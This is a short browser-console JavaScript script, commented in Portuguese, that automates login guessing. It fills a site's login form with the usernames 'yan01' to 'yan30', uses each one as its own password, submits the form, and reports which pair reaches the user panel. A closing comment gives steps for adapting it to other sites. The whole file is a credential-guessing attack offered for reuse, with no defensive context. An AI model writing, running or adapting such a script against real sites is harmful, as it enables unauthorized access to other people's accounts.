// Lista de usuários e senhas para testar.
const usuarios = [];
const senhas = [];

// Preenche as listas com "yan01" a "yan30".
for (let i = 1; i <= 30; i++) {
    const numFormatado = String(i).padStart(2, '0');
    usuarios.push(`yan${numFormatado}`);
    senhas.push(`yan${numFormatado}`);
}

// Variável para controlar a execução
let pararExecucao = false;

// Função para parar a execução
function stop() {
    pararExecucao = true;
    console.warn('%cExecução interrompida pelo usuário.', 'color: orange;');
}

// Exponha a função stop no escopo global (window) para que possa ser chamada no console.
window.stop = stop;

// Tenta o login com um usuário e senha.
async function tentarLogin(usuario, senha) {
    // Encontra os campos e o formulário (ADAPTAR OS SELECTORES!).
    const usuarioInput = document.querySelector('input[name="login"]');
    const senhaInput = document.querySelector('input[name="pass"]');
    const form = document.querySelector('form[action="logar.php"]');

    if (!usuarioInput || !senhaInput || !form) return false; // Elementos não encontrados.

    usuarioInput.value = usuario;
    senhaInput.value = senha;
    form.submit();

    await new Promise(resolve => setTimeout(resolve, 2500)); // Aguarda (AJUSTAR O TEMPO).

    // Verifica se o login foi bem-sucedido (ADAPTAR A LÓGICA!).
    const painelUsuario = document.querySelector('#painel_usuario');
    if (painelUsuario) {
        console.log(`%cSucesso: ${usuario}/${senha}`, 'color: green;'); // Login bem-sucedido!
        return true;
    } else {
        console.error(`%cFalha: ${usuario}/${senha}`, 'color: red;'); // Login falhou!
        return false;
    }
}

// Executa os testes de login.
async function executarTestes() {
    for (let i = 0; i < usuarios.length; i++) {
        if (pararExecucao) {
            console.log('%cExecução finalizada.', 'color: orange;');
            return;
        }

        const usuario = usuarios[i];
        const senha = senhas[i];

        console.log(`Testando: ${usuario}/${senha}`);

        if (await tentarLogin(usuario, senha)) return; // Para ao encontrar um login válido.
    }
    console.log('%cFalha: Nenhuma combinação funcionou.', 'color: red;');
}

executarTestes();

/* **Adaptando para outro site:**
1. Inspecione o HTML do login.
2. Adapte os seletores CSS em `tentarLogin()`.
3. Adapte a lógica de sucesso em `tentarLogin()`.
4. Ajuste o tempo de espera.
5. Modifique a geração de usuários/senhas. */
